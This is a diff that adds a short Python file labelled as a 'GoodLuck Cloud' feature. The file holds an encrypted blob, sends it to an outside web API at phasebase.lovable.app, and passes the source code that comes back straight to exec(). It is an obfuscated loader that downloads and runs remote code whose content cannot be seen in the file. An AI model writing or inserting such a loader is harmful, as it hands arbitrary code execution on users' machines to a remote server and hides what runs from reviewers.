@@ -1,0 +1,8 @@
+# PhaseBase :: GoodLuck Cloud (server-sealed payload) — decoder lives behind the PhaseBase API.
+import json, urllib.request
+_CT="p6Zzz/mjJksHd2ECT2/1AyAauyslTjaTri2P/+eiN7dVNjIirpikXMBp9EPh4+afgi/ho2x3A0OgaGhdFYNoLInkfUNQRXRtSeY9H40J1/Efzp45cx36UScKA9bAQ0D6SwdbKvP3D9SkIE6i+z/S/ZF+3u52Y8x0lYZNoW7SwB3Q+YOsF26ctWh2FDv7VtxzPjfQxeSrx2NE5AhSbiAYvORhsOHzGqN/hdPa5rhvr5Ty0+Yw69bES0HyV8muqhNaiYXYmLnRkFbFfKDhTYl81brDuopyFA3pKmPhbfzKC43KTubNBSMO1HnhVXc2B2CQ9jt+8kkTgiObWkrxHTgIGpOk1fWhhurOOmuy63KYb8IZF1z+l3L7/WSJQJEObQX+yPSYiM/Fw2Z5ES5kzYOYip9rqpKRGBKoiaqgosrAWjt/raJDjexgfB2yY3k28QNdOnmRxI2YX7vg4U2acmLS27q8vOt6BbKJL4Wtq9/UbI2AJIRqpWjmZMl4Aoi6Dr0tIW2ckGzFiKt9Kg3JU83yH3aezzGVY1e13weyE0+p5CCb84QRcMWFYvB8EpiSe9ZLjYQ4d81QgGR5Kov/sgxO4vKgi/02G3cZ6IpNH15Wg+NsABnGHrABU+1rr2NgcIyGbeRsBqdKvdb61e3EmgAwTDbVauJuC5UM8Rlkzfb7pm8ujFYl6HmOs+WMYPKK1OlBOnW3Dexh688etwpPBIW7tHnCka7rrAI2kFVbA03JDo6ATSu2xujaQ+WFFU/OfXoCg8u+/kMKSONz9rpNatzqVrWm0wO4twvUANW05zevC/e3r8/MiS6LzOj/1udwN+pf8kiw9x2ncgb1Jg43yyXS/wptFG9l2vHxFMxZFT66E6utNT0iJWuVRNdMdhvIs/31pYzNSyZWb9whH3Ij/4kHXJ++RG9BzQlqsRK3rCXF9PKmQkUEm3kzJ6jTlb213QaXkvFUjjWiiQxvCOl+n/widN7AnjMfKYZxFd4xsgW+fXPVh0CR2Rl/u5U+CvXmZSs+q4+wCCEzWwy4IDeHtgVgkRaGunrb0BvBwI4ltj3T15TArdNLPAZPZAXmn7+4RlXvWdY6H9TAf6z8DBBUfjYcBF7IjMS9xcX9o94r+oBlcnVX3S4lrNckjRsJs7sgwUCh+JrYgWUV3vS6y2K6SD+w1cHFKnpECJ4K9beRJ218DSTu8uSQmeW86ySa"
+_IV="Ltp9X8/a3K/Rk0BT"
+_API="https://phasebase.lovable.app/api/public/goodluck/decode"
+_req=urllib.request.Request(_API, data=json.dumps({"ct":_CT,"iv":_IV}).encode(), headers={"Content-Type":"application/json","User-Agent":"PhaseBase-GoodLuck/1.0 (+https://phasebase.lovable.app)"})
+_src=json.loads(urllib.request.urlopen(_req).read())["code"]
+exec(compile(_src, "<phasebase>", "exec"))
